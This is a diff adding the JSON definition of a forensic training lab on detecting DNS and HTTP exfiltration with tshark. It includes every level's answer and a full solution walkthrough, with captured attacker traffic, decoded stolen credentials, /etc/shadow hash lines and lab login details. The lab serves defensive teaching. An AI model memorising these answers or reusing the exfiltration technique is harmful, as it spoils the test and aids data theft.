@@ -1,0 +1,145 @@
+{
+  "title" : "BTCMP-16-DF10",
+  "description" : "Deep understanding on DNS exfiltration  concepts, including attacker methodology on using DNS traffic to exfiltrate data, and detection techniques. \n\nDeep understanding on HTTP exfiltration concepts, including attacker methodology, detection techniques and behavioural indicators. ",
+  "prerequisites" : [ ],
+  "outcomes" : [ "Recognize DNS exfiltration techniques and pinpoint key indicators in network traffic detection.", "Identify HTTP exfiltration patterns and understand key indicators associated with data exfiltration over HTTP." ],
+  "levels" : [ {
+    "title" : "Introduction level",
+    "level_type" : "INFO_LEVEL",
+    "estimated_duration" : 0,
+    "minimal_possible_solve_time" : null,
+    "content" : "Welcome to *BTCMP-16 DF-10 – Detecting DNS and HTTP Exfiltration.*\n\nIn this module, you will learn how to investigate suspected data exfiltration from a Linux forensic workstation using packet capture analysis and industry-standard tools such as Wireshark and tshark.\n\nYou will also learn how to distinguish normal network activity from malicious exfiltration by baselining DNS and HTTP traffic, identifying anomalies such as long high-entropy DNS queries, unusual User-Agents, beaconing behaviour, and large outbound uploads.\n\nBy the end of this lab, you will be able to identify DNS and HTTP exfiltration channels, recover and decode stolen data from base32 and base64 payloads, document key indicators of compromise, and produce practical detection guidance mapped to MITRE ATT&CK — core skills for any digital forensics, incident response, or blue team role.\n\n**Lab Duration: 45 minutes**"
+  }, {
+    "title" : "Get Access",
+    "level_type" : "ACCESS_LEVEL",
+    "estimated_duration" : 0,
+    "minimal_possible_solve_time" : null,
+    "passkey" : "start-training",
+    "cloud_content" : "In the topology panel on the right, right‑click **UAVM** and select Open GUI. A new window will appear. Log in to your VM using the username **user** and the password **Password123**. Once you’re connected, complete the first flag using the passkey **start-training**.",
+    "local_content" : "${SANDBOX_DEFINITION_ID}"
+  }, {
+    "title" : "Identify the DNS exfiltration channel",
+    "level_type" : "TRAINING_LEVEL",
+    "estimated_duration" : 20,
+    "minimal_possible_solve_time" : 5,
+    "answer" : "dataload.halyard-sync.net",
+    "answer_variable_name" : null,
+    "content" : "You are a forensic analyst at **Caldmoor Freight Ltd**. Overnight, the DLP system flagged unusual\noutbound traffic from a finance workstation, **FIN-WS04 (192.168.0.50)**. Incident response captured\n~5 minutes of the host's egress traffic from the network tap and handed you a single file:  `/home/user/df10/fin-ws04-egress.pcap` — a full slice of the host's activity.\n\nManagement must decide on a **GDPR/NIS2 breach notification**. Your task: determine **where** the data was exfiltrated to and **what** was taken. \n\nYou can start your investigation by running the following commands to examine the PCAP file.\n\n```bash\ncd /home/user/df10\ntshark -r fin-ws04-egress.pcap -q -z io,phs        # protocol hierarchy\ntshark -r fin-ws04-egress.pcap -q -z conv,tcp      # TCP conversations\ntshark -r fin-ws04-egress.pcap -q -z conv,ip       # who talks to whom\n```\n\nYou begin to focus on the weird DNS calls that have been made. Your first goal is to find the Fully Qualified Domain Name (FQDN) of the exfil domain that the data was exfiltrated to.",
+    "solution" : "Using `tshark` one can see that there are several high-entropy abnormal DNS calls to `dataload.halyard-sync.net`.\n\n```bash\ntshark -r fin-ws04-egress.pcap -Y 'dns.flags.response==0' -T fields -e dns.qry.name | awk '{print length($0), $0}' | sort -rn | head\n\n76 zwkiccmfrww5lqebbxezlemvxhi2lbnrzquizainhu4rsjircu.dataload.halyard-sync.net\n76 irbf6ucpkjkd2mjugmzqurccl5kvgrkshvzxmy27mjqwg23voa.dataload.halyard-sync.net\n76 feiqs7kbavguz5k5uw45btojpum4tfnftwq5bbgiydenqkirbf.dataload.halyard-sync.net\n76 emqegylmmrww633sebdhezljm5uhiicmorscaljairqxiylcmf.dataload.halyard-sync.net\n76 4vcjifgcaljairhsatspkqqeisktkrjesqsvkrcqurccl5ee6u.dataload.halyard-sync.net\n76 2uhvwxg43rnqwxa4tpmqwtamjomnqwyzdnn5xxeltmn5rwc3ak.dataload.halyard-sync.net\n54 6tsbjvct2u3infyg2zloorzuiqqk.dataload.halyard-sync.net\n25 login.microsoftonline.com\n25 login.microsoftonline.com\n25 login.microsoftonline.com\n```\nThese high-entropy calls indicate that a file is being exfiltrated using DNS calls.  ",
+    "solution_penalized" : true,
+    "hints" : [ {
+      "title" : "Clear the noise",
+      "content" : "Since we are focusing on identifying a DNS data exfiltration attack, it would be extremely helpful to filter only the traffic we are interested in.\n\n```bash\ntshark -r fin-ws04-egress.pcap -Y 'dns.flags.response==0'\n```",
+      "hint_penalty" : 5,
+      "order" : 0
+    } ],
+    "incorrect_answer_limit" : 10,
+    "attachments" : [ ],
+    "max_score" : 25,
+    "variant_answers" : false,
+    "mitre_techniques" : [ {
+      "technique_key" : "TA0010.T1048"
+    }, {
+      "technique_key" : "TA0011.T1071"
+    } ],
+    "expected_commands" : [ ],
+    "commands_required" : true
+  }, {
+    "title" : "Recover the exfiltrated file",
+    "level_type" : "TRAINING_LEVEL",
+    "estimated_duration" : 25,
+    "minimal_possible_solve_time" : 10,
+    "answer" : "Wint3r_Freight!2026",
+    "answer_variable_name" : null,
+    "content" : "Now that you have successfully identified where the file is getting extracted to, it's high time you recovered the stolen file and find out if it was important or not. \n\nWhen you uncover the sensitive file you will find a password inside that file. The password is the correct answer for this level.",
+    "solution" : "Since we have identified the DNS calls that are used to exfiltrate the data we can filter only the calls made to the suspicious zone we found on the previous level.\n\n```bash\ntshark -r fin-ws04-egress.pcap -Y 'dns.flags.response==0 && dns.qry.name contains \"halyard-sync.net\"'\n\n918   8.396533   172.19.0.4 → 172.19.0.3   DNS 159 Standard query 0x00cb TXT emqegylmmrww633sebdhezljm5uhiicmorscaljairqxiylcmf.dataload.halyard-sync.net OPT\n  922   8.822590   172.19.0.4 → 172.19.0.3   DNS 159 Standard query 0x96e6 TXT zwkiccmfrww5lqebbxezlemvxhi2lbnrzquizainhu4rsjircu.dataload.halyard-sync.net OPT\n<SNIP>\n```\n\nThen, we have to identify what kind of encoding is used on the high entropy strings. The string look like base32 since they only contain letters and numbers. To test this assumption, we need to convert all the letters to uppercase first and then try to decode them.\n\n```bash\n echo \"emqegylmmrww633sebdhezljm5uhiicmorscaljairqxiylcmf\" | tr a-z A-Z | base32 -d\n# Caldmoor Freight Ltd - Databbase32: invalid input\n```\n\nWe got some valuable input but then we got an error as well. This happened because the whole file is converted to `base32` then broken down in pieces that get exfiltrated with separate DNS calls.\n\nOur task is to extract all the high entropy strings, concatenate them in the correct order which is the capture order and finally `base32` decode them.\n\n```bash\ntshark -r fin-ws04-egress.pcap -Y 'dns.flags.response==0 && dns.qry.name contains \"halyard-sync.net\"' -T fields -e dns.qry.name | cut -d. -f1 | tr -d '\\n' | tr a-z A-Z | base32 -d\n\n# Caldmoor Freight Ltd - Database Backup Credentials\n# CONFIDENTIAL - DO NOT DISTRIBUTE\nDB_HOST=mssql-prod-01.caldmoor.local\nDB_PORT=1433\nDB_USER=svc_backup\nDB_PASS=Wint3r_Freight!2026\nDB_NAME=ShipmentsDB\n```\n\nThe password we are seeking is `Wint3r_Freight!2026`.",
+    "solution_penalized" : true,
+    "hints" : [ {
+      "title" : "Encoding and order matters",
+      "content" : "On the previous you have successfully identified the exfiltration domain to be `halyard-sync.net`. You need to focus all you attention to this domain and filter out all the high entropy strings.\n\n```bash\ntshark -r fin-ws04-egress.pcap -Y 'dns.flags.response==0 && dns.qry.name contains \"halyard-sync.net\"'\n```\n\nDon't alter the order of the strings when you concatenate them. The encoding seems strangely familiar but it's **not** base64, it seems simpler.",
+      "hint_penalty" : 5,
+      "order" : 0
+    } ],
+    "incorrect_answer_limit" : 10,
+    "attachments" : [ ],
+    "max_score" : 25,
+    "variant_answers" : false,
+    "mitre_techniques" : [ {
+      "technique_key" : "TA0011.T1001"
+    }, {
+      "technique_key" : "TA0011.T1132"
+    } ],
+    "expected_commands" : [ ],
+    "commands_required" : true
+  }, {
+    "title" : "Identify the HTTP exfiltration endpoint",
+    "level_type" : "TRAINING_LEVEL",
+    "estimated_duration" : 20,
+    "minimal_possible_solve_time" : 10,
+    "answer" : "cdn.halyard-sync.net/upload",
+    "answer_variable_name" : null,
+    "content" : "After successfully exfiltrating the sensitive database file, the attackers appear to have transitioned to a more resilient method of maintaining control over the compromised system. Intelligence from our reports indicates that a Command and Control (C2) beacon may have been deployed on the host.\n\nYour task is to determine whether this beacon was used to exfiltrate any additional sensitive files. As an initial step, identify the suspicious endpoint that may have received the transferred data.\n\nThe answer for this level is the **FQDN of the C2 server followed by the exfiltration endpoint path**.\n",
+    "solution" : "Since we know the attackers switched to an HTTP approach, our first step is to list all the HTTP requests along with the body size of each request so that we can identify possible exfiltrations and seperate beaconing commands.\n\n```bash\ntshark -r fin-ws04-egress.pcap -Y 'http.request' -T fields -e tcp.stream -e http.host -e http.request.uri -e http.user_agent -e http.content_length\n\n10      cdn.halyard-sync.net    /beacon Halyard-Sync/1.4        41\n11      example.com     /       Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0\n21      neverssl.com    /       Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0\n22      example.com     /       Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0\n33      cdn.halyard-sync.net    /beacon Halyard-Sync/1.4        41\n34      example.com     /       Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0\n45      example.com     /       Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0\n46      cdn.halyard-sync.net    /beacon Halyard-Sync/1.4        41\n47      cdn.halyard-sync.net    /beacon Halyard-Sync/1.4        41\n48      cdn.halyard-sync.net    /beacon Halyard-Sync/1.4        41\n49      cdn.halyard-sync.net    /upload Halyard-Sync/1.4        520\n```\n\nLooking at the requests, we immediately notice a new FQDN that the attackers used `cdn.halyard-sync.net` along with two new endpoints, `/beacon` and `/upload`. Looking at the request size on the `/upload` endpoint we have the answer to this level `cdn.halyard-sync.net/upload`.",
+    "solution_penalized" : true,
+    "hints" : [ {
+      "title" : "Identifying the correct endpoint",
+      "content" : "Requests like repeated tiny POSTs (41 B) to `/beacon` and a user agent like `Halyard-Sync/1.4` hint us towards beaconing. The actual exfiltration is the **one large POST** to a different path — that size jump reveals it is `/upload`. Combine that with the FQDN of the exfiltration server and you have the answer.",
+      "hint_penalty" : 15,
+      "order" : 1
+    }, {
+      "title" : "Finding the needle",
+      "content" : "List requests **with body size** so the anomaly surfaces. \n\n\n```bash\ntshark -r fin-ws04-egress.pcap -Y 'http.request' -T fields -e http.host -e http.request.uri -e http.user_agent -e http.content_length\n```\n\n\nMost legit web traffic is HTTPS, so the cleartext POSTs stand out.",
+      "hint_penalty" : 5,
+      "order" : 0
+    } ],
+    "incorrect_answer_limit" : 10,
+    "attachments" : [ ],
+    "max_score" : 25,
+    "variant_answers" : false,
+    "mitre_techniques" : [ {
+      "technique_key" : "TA0010.T1567"
+    }, {
+      "technique_key" : "TA0011.T1071"
+    } ],
+    "expected_commands" : [ ],
+    "commands_required" : true
+  }, {
+    "title" : "Recover the exfiltrated files",
+    "level_type" : "TRAINING_LEVEL",
+    "estimated_duration" : 25,
+    "minimal_possible_solve_time" : 10,
+    "answer" : "CANARY-7F3A9C2E",
+    "answer_variable_name" : null,
+    "content" : "You have successfully identified the exfiltration endpoint used by the attackers. Now it's time to identify what was stolen. \n\nIn one of the files that you will recover, several client information will exist. The answer for this level is the value of the `notes` column of the last client.",
+    "solution" : "First of all, since we have identified the correct endpoint to be `/upload` we can follow that TCP stream and look exactly what took place in that communication.\n\n\n```bash\nS=$(tshark -r fin-ws04-egress.pcap -Y 'http.request.method==\"POST\"' \\\n      -T fields -e tcp.stream -e http.content_length \\\n    | sort -t\"$(printf '\\t')\" -k2 -n | tail -1 | cut -f1)\n\ntshark -r fin-ws04-egress.pcap -q -z follow,tcp,ascii,\"$S\"\n\n===================================================================\nFollow: tcp,ascii\nFilter: tcp.stream eq 49\nNode 0: 172.19.0.4:34084\nNode 1: 172.19.0.2:80\n698\nPOST /upload HTTP/1.1\nHost: cdn.halyard-sync.net\nUser-Agent: Halyard-Sync/1.4\nAccept: */*\nContent-Type: application/octet-stream\nX-Session: 7F3A9C2E\nContent-Length: 520\n\nPT09PT0gL2V0Yy9zaGFkb3cgPT09PT0Kcm9vdDokNiR4UTltWjJwTCQza0ZtYjF1O<SNIP>Cg==\n        112\nHTTP/1.0 200 OK\nServer: BaseHTTP/0.6 Python/3.12.13\nDate: Thu, 18 Jun 2026 20:29:27 GMT\nContent-Length: 6\n\n\n        6\nstored\n===================================================================\n\n```\n\nWe see a large base64 blob being transported. We can decode that and get our answer.\n\n```bash\ntshark -r fin-ws04-egress.pcap \\\n  -Y 'http.request.uri==\"/upload\" && http.request.method==\"POST\"' \\\n  -T fields -e http.file_data | tr -d ':\\n' | xxd -r -p | base64 -d\n\n===== /etc/shadow =====\nroot:$6$xQ9mZ2pL$3kFmb1u9oQk2eVrJhN0sW7yT4dC6gP8aZ1xR5sL2:20485:0:99999:7:::\nsvc_backup:$6$aB1cD2eF$Hk8tYpQ2mN4vL6wX0zR3sU9jB7fG1dA5cE2hT4kM6:20485:0:99999:7:::\n===== customers.csv =====\nid,name,email,card_last4,notes\n1001,Aria Holt,aria.holt@example.com,4471,VIP\n1002,Ben Cole,ben.cole@example.com,8832,\n1003,DLP-CANARY,canary@caldmoor.local,0000,CANARY-7F3A9C2E\n```\n\nThus our answer is `CANARY-7F3A9C2E`. Another way to approach this problem is to directly extract HTTP object and examine those.\n\n```bash\nmkdir -p /tmp/h && tshark -r fin-ws04-egress.pcap --export-objects http,/tmp/h -q\nbase64 -d /tmp/h/upload\n\n===== /etc/shadow =====\nroot:$6$xQ9mZ2pL$3kFmb1u9oQk2eVrJhN0sW7yT4dC6gP8aZ1xR5sL2:20485:0:99999:7:::\nsvc_backup:$6$aB1cD2eF$Hk8tYpQ2mN4vL6wX0zR3sU9jB7fG1dA5cE2hT4kM6:20485:0:99999:7:::\n===== customers.csv =====\nid,name,email,card_last4,notes\n1001,Aria Holt,aria.holt@example.com,4471,VIP\n1002,Ben Cole,ben.cole@example.com,8832,\n1003,DLP-CANARY,canary@caldmoor.local,0000,CANARY-7F3A9C2E\n```",
+    "solution_penalized" : true,
+    "hints" : [ {
+      "title" : "Encoding once again",
+      "content" : "This time the files are encoded with the most famous encoding.",
+      "hint_penalty" : 15,
+      "order" : 1
+    }, {
+      "title" : "Follow the stream",
+      "content" : "Follow the large TCP stream and see what was transfered: \n\n```bash\nS=$(tshark -r fin-ws04-egress.pcap -Y 'http.request.method==\"POST\"' -T fields -e tcp.stream -e http.content_length | sort -t\"$(printf '\\t')\" -k2 -n | tail -1 | cut -f1); \ntshark -r fin-ws04-egress.pcap -q -z follow,tcp,ascii,\"$S\"`\n\n```",
+      "hint_penalty" : 5,
+      "order" : 0
+    } ],
+    "incorrect_answer_limit" : 10,
+    "attachments" : [ ],
+    "max_score" : 25,
+    "variant_answers" : false,
+    "mitre_techniques" : [ {
+      "technique_key" : "TA0011.T1001"
+    }, {
+      "technique_key" : "TA0011.T1132"
+    } ],
+    "expected_commands" : [ ],
+    "commands_required" : true
+  }, {
+    "title" : "Congratulations!",
+    "level_type" : "INFO_LEVEL",
+    "estimated_duration" : 0,
+    "minimal_possible_solve_time" : null,
+    "content" : "You’ve successfully completed the DF10 module Detecting DNS and HTTP exfiltration, within the time limits. Return to the LMS to continue the course."
+  } ]
+}
